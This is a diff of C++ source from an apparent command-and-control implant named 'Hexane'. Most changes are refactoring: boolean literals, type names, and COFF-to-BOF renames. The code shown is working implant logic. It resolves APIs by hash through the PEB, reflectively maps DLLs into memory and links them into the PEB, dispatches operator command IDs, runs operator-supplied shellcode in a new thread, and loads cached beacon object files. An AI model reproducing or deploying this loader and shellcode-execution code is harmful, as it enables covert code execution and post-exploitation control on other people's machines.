@@ -67,24 +67,24 @@ namespace Memory {
             instance.base.size              = U_PTR(InstEnd()) - instance.base.address;
 
             if (!(instance.modules.ntdll = (HMODULE) M_PTR(NTDLL))) {
-                return FALSE;
+                return false;
             }
 
             F_PTR_HMOD(instance.memapi.RtlAllocateHeap, instance.modules.ntdll, RTLALLOCATEHEAP);
             if (!instance.memapi.RtlAllocateHeap) {
-                return FALSE;
+                return false;
             }
 
             region = RVA(PBYTE, instance.base.address, &__instance);
             if (!(C_DREF(region) = instance.memapi.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)))) {
-                return FALSE;
+                return false;
             }
 
             MemCopy(C_DREF(region), &instance, sizeof(_hexane));
             MemSet(&instance, 0, sizeof(_hexane));
             MemSet(RVA(PBYTE, region, sizeof(LPVOID)), 0, 0xE);
 
-            return TRUE;
+            return true;
         }
 
         VOID ContextDestroy() {
@@ -94,9 +94,9 @@ namespace Memory {
             auto free = ctx->memapi.RtlFreeHeap;
             auto heap = ctx->heap;
 
-            // free coff executables
+            // free bof executables
             for (auto head = ctx->bof_cache; head; head = head->next) {
-                RemoveCoff(head->bof_id);
+                RemoveCOFF(head->bof_id);
             }
 
             if (free) {
@@ -106,7 +106,7 @@ namespace Memory {
     }
 
     namespace Modules {
-	    LDR_DATA_TABLE_ENTRY *GetModuleEntry(CONST UINT32 hash) {
+	    LDR_DATA_TABLE_ENTRY *GetModuleEntry(CONST uint32 hash) {
 		    const auto head = &(PEB_POINTER)->Ldr->InMemoryOrderModuleList;
 
 		    for (auto next = head->Flink; next != head; next = next->Flink) {
@@ -123,7 +123,7 @@ namespace Memory {
 		    return nullptr;
 	    }
 
-	    FARPROC GetExportAddress(CONST VOID *base, CONST UINT32 hash) {
+	    FARPROC GetExportAddress(CONST VOID *base, CONST uint32 hash) {
 		    FARPROC address = nullptr;
 
 		    const auto nt_head = (PIMAGE_NT_HEADERS) (B_PTR(base) + ((PIMAGE_DOS_HEADER) base)->e_lfanew);
@@ -152,20 +152,20 @@ namespace Memory {
 	    	HEXANE;
 
 		    if (!filename) {
-			    return FALSE;
+			    return false;
 		    }
 
 		    module->local_name		= filename;
 		    module->cracked_name	= (PWCHAR) ctx->memapi.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, MAX_PATH * 2);
 
 		    if (!module->cracked_name) {
-			    return FALSE;
+			    return false;
 		    }
 
 		    CONST WCHAR *location = ctx->ioapi.PathFindFileNameW(filename);
 		    MemCopy(module->cracked_name, location, (WcsLength(location) % (MAX_PATH - 1)) * 2);
 
-		    return TRUE;
+		    return true;
 	    }
 
 	    BOOL ReadModule(EXECUTABLE *module) {
@@ -173,31 +173,31 @@ namespace Memory {
 
 		    HANDLE handle = ctx->ioapi.CreateFileW(module->local_name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
 		    if (handle == INVALID_HANDLE_VALUE) {
-			    return FALSE;
+			    return false;
 		    }
 
 		    DWORD size = ctx->ioapi.GetFileSize(handle, nullptr);
 		    if (size == INVALID_FILE_SIZE) {
 			    ctx->utilapi.NtClose(handle);
-			    return FALSE;
+			    return false;
 		    }
 
 		    if (!NT_SUCCESS(ntstatus = ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (LPVOID*) &module->buffer, size, (PSIZE_T) &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
 			    ctx->utilapi.NtClose(handle);
-			    return FALSE;
+			    return false;
 		    }
 
 		    if (!ctx->ioapi.ReadFile(handle, module->buffer, size, (LPDWORD) &module->size, nullptr)) {
 		    	ctx->memapi.NtFreeVirtualMemory(NtCurrentProcess(), (LPVOID*) &module->buffer, &module->size, 0);
 			    ctx->utilapi.NtClose(handle);
-			    return FALSE;
+			    return false;
 		    }
 
 		    ctx->utilapi.NtClose(handle);
-		    return TRUE;
+		    return true;
 	    }
 
-	    BOOL MapSections(PEXECUTABLE module) {
+	    BOOL MapSections(EXECUTABLE *module) {
 		    HEXANE;
 
 		    auto region_size		= (SIZE_T)module->nt_head->OptionalHeader.SizeOfImage;
@@ -238,10 +238,10 @@ namespace Memory {
 
 				    do {
 					    switch (head->Type) {
-					    case IMAGE_REL_BASED_DIR64:		*(UINT32*)(B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += base_offset; break;
-					    case IMAGE_REL_BASED_HIGHLOW:	*(UINT32*)(B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += (uint32) base_offset; break;
-					    case IMAGE_REL_BASED_HIGH:		*(UINT32*)(B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += HIWORD(base_offset); break;
-					    case IMAGE_REL_BASED_LOW:		*(UINT32*)(B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += LOWORD(base_offset); break;
+					    case IMAGE_REL_BASED_DIR64:		*(uint32 *)(B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += base_offset; break;
+					    case IMAGE_REL_BASED_HIGHLOW:	*(uint32 *)(B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += (uint32) base_offset; break;
+					    case IMAGE_REL_BASED_HIGH:		*(uint32 *)(B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += HIWORD(base_offset); break;
+					    case IMAGE_REL_BASED_LOW:		*(uint32 *)(B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += LOWORD(base_offset); break;
 					    }
 					    head++;
 				    }
@@ -256,18 +256,17 @@ namespace Memory {
 		    return true;
 	    }
 
-	    PEXECUTABLE LoadModule(CONST UINT32 load_type, WCHAR *filename, UINT8 *memory, CONST UINT32 mem_size, WCHAR *name) {
+	    PEXECUTABLE LoadModule(const uint32 load_type, wchar_t *filename, uint8 *memory, const uint32 mem_size, wchar_t *name) {
 	    	// NOTE: code based off of https://github.com/bats3c/DarkLoadLibrary
-	    	// TODO: see if this can be used on bofs
 	    	HEXANE;
 
-		    auto module = (EXECUTABLE*) ctx->memapi.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, sizeof(EXECUTABLE));
+		    auto module = (EXECUTABLE *) ctx->memapi.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, sizeof(EXECUTABLE));
 		    if (!module) {
 			    return nullptr;
 		    }
 
-		    module->success	= FALSE;
-		    module->link	= TRUE;
+		    module->success	= false;
+		    module->link	= true;
 
 		    switch (LOWORD(load_type)) {
 		    	case LoadLocalFile:
@@ -292,27 +291,27 @@ namespace Memory {
 		    }
 
 		    if (load_type & NoLink)
-			    module->link = FALSE;
+			    module->link = false;
 
 		    if (name == nullptr) {
 			    name = module->cracked_name;
 		    }
 
 	    	if ((load_type & LoadBof) != LoadBof) {
-			    if (PLDR_DATA_TABLE_ENTRY check_module = GetModuleEntry(HashStringW(name, WcsLength(name)))) {
-				    module->base = (ULONG_PTR) check_module->DllBase;
-				    module->success = TRUE;
+			    if (LDR_DATA_TABLE_ENTRY *check_module = GetModuleEntry(HashStringW(name, WcsLength(name)))) {
+				    module->base	= (uintptr_t) check_module->DllBase;
+				    module->success = true;
 
 				    goto defer;
 			    }
 	    	}
 
-	    	auto image = Methods::CreateImage(module->buffer);
+	    	const auto image = Methods::CreateImage(module->buffer);
 		    if (!ImageCheckArch(image)) {
 		    	goto defer;
 		    }
 
-	    	// DestroyImage(module);
+	    	// TODO: DestroyImage(module);
 	    	Free(image);
 
 		    // map the sections into memory
@@ -321,7 +320,7 @@ namespace Memory {
 		    }
 
 		    if (module->link) {
-			    if (!LinkModuleToPEB(module)) {
+			    if (!LinkModule(module)) {
 				    goto defer;
 			    }
 		    }
@@ -331,7 +330,7 @@ namespace Memory {
 			    goto defer;
 		    }
 
-		    module->success = TRUE;
+		    module->success = true;
 
 	    defer:
 		    return module;
@@ -339,7 +338,7 @@ namespace Memory {
 
 
 	    BOOL ConcealLibrary(EXECUTABLE pdModule, BOOL bConceal) {
-		    return FALSE;
+		    return false;
 	    }
     }
 
@@ -352,32 +351,34 @@ namespace Memory {
 
             const auto cmd_id = UnpackUint32(&parser);
             if (cmd_id == NOJOB) {
-                return TRUE;
+                return true;
             }
 
             if (!(pointer = GetCommandAddress(cmd_id))) {
                 // LOG ERROR
-                return FALSE;
+                return false;
             }
 
             const auto cmd = (COMMAND) RVA(PBYTE, ctx->base.address, pointer);
             cmd(&parser);
 
-            return TRUE;
+            return true;
         }
 
         BOOL ExecuteShellcode(CONST PARSER &parser) {
             HEXANE;
 
-            VOID* base      = nullptr;
-            VOID (*exec)()  = nullptr;
+            void *base      = nullptr;
+            void (*exec)()  = nullptr;
 
-            BOOL success = TRUE;
+        	HANDLE handle	= nullptr;
+            BOOL success	= true;
+
             size_t size = parser.length;
 
             if (!NT_SUCCESS(ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
                 // LOG ERROR
-                success = FALSE;
+                success = false;
                 goto defer;
             }
 
@@ -385,12 +386,12 @@ namespace Memory {
 
             if (!NT_SUCCESS(ctx->memapi.NtProtectVirtualMemory(NtCurrentProcess(), &base, &size, PAGE_EXECUTE_READ, nullptr))) {
                 // LOG ERROR
-                success = FALSE;
+                success = false;
                 goto defer;
             }
 
             exec = (void(*)()) base;
-            ctx->threadapi.NtCreateThreadEx(nullptr, 0, (LPTHREAD_START_ROUTINE) exec, nullptr, 0, nullptr);
+            ntstatus = ctx->threadapi.NtCreateThreadEx(&handle, THREAD_ALL_ACCESS, nullptr, NtCurrentProcess(), (PUSER_THREAD_START_ROUTINE) exec, nullptr, NULL, NULL, NULL, NULL, nullptr);
 
             MemSet(base, 0, size);
 
@@ -405,41 +406,41 @@ namespace Memory {
         VOID LoadObject(_parser parser) {
             HEXANE;
 
-            PCOFF_PARAMS coff  = (_coff_params*) Malloc(sizeof(_coff_params));
-            PCOFF_PARAMS saved = nullptr;
+            COFF_PARAMS *bof  = (_coff_params *) Malloc(sizeof(_coff_params));
+            COFF_PARAMS *saved = nullptr;
 
-            coff->entrypoint    = UnpackString(&parser, (UINT32*) &coff->entrypoint_length);
-            coff->data          = UnpackBytes(&parser, (UINT32*) &coff->data_size);
-            coff->args          = UnpackBytes(&parser, (UINT32*) &coff->args_size);
-            coff->b_cache       = UnpackByte(&parser);
-            coff->bof_id		= UnpackUint32(&parser);
-            coff->task_id       = ctx->session.current_taskid;
+            bof->entrypoint = UnpackString(&parser, (uint32 *) &bof->entrypoint_length);
+            bof->data       = UnpackBytes(&parser, (uint32 *) &bof->data_size);
+            bof->args       = UnpackBytes(&parser, (uint32 *) &bof->args_size);
+            bof->b_cache    = UnpackByte(&parser);
+            bof->bof_id		= UnpackUint32(&parser);
+            bof->task_id    = ctx->session.current_taskid;
 
             // TODO: with previously loaded BOFs (peer_id, task_id, msg_type, msg_length, [entrypoint, null, args, etc..])
-            // TODO: test that coff data size being zero is a correct way to do this
+            // TODO: test that bof data size being zero is a correct way to do this
 
-            if (!coff->data_size) {
-                saved = GetCoff(coff->bof_id);
+            if (!bof->data_size) {
+                saved = GetCOFF(bof->bof_id);
 
-                coff->data      = saved->data;
-                coff->data_size = saved->data_size;
+                bof->data      = saved->data;
+                bof->data_size = saved->data_size;
             }
 
-            if (!CreateUserThread(NtCurrentProcess(), (VOID*) CoffThread, coff, nullptr)) {
+            if (!CreateUserThread(NtCurrentProcess(), (void *) COFFThread, bof, nullptr)) {
                 // LOG ERROR
                 // do not return
             }
 
             if (!saved) {
-                AddCoff(coff);
+                AddCOFF(bof);
             }
 
             // NOTE: keep original task_id after every run or update (?)
-            // NOTE: operator now has the option to remove a BOF any time with b_cache (FALSE == "remove")
+            // NOTE: operator now has the option to remove a BOF any time with b_cache (false == "remove")
             // TODO: server should keep BOF information stored locally for this
 
-            if (!coff->b_cache) {
-                RemoveCoff(coff->bof_id);
+            if (!bof->b_cache) {
+                RemoveCOFF(bof->bof_id);
             }
         }
     }
